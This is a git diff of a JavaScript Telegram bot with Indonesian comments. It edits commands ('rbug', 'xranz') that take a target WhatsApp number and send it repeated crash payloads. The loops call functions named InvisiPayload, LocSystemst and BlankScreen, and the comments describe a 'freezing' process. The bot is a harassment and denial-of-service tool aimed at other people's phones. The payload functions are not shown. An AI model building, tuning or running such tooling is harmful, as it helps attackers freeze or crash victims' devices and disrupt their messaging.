@@ -656,7 +656,7 @@ bot.use((ctx, next) => {
   // Gunakan middleware
   checkChatType(ctx, next);
 });
-bot.command("ranzbug", checkWhatsAppConnection, async ctx => {
+bot.command("rbug", checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -674,8 +674,8 @@ bot.command("ranzbug", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 200; i++) {
-   await InvisiPayload(sock, target);
+  for (let i = 0; i < 10; i++) {
+   await f10(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
@@ -701,8 +701,9 @@ bot.command("xranz", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 30; i++) {
-    await XeonXRobust(target, { ptcp: true });    
+  for (let i = 0; i < 5; i++) {
+    await LocSystemst(target, { ptcp: true });    
+    await BlankScreen(target, { ptcp: true });    
   }
 
   // Menyelesaikan proses response
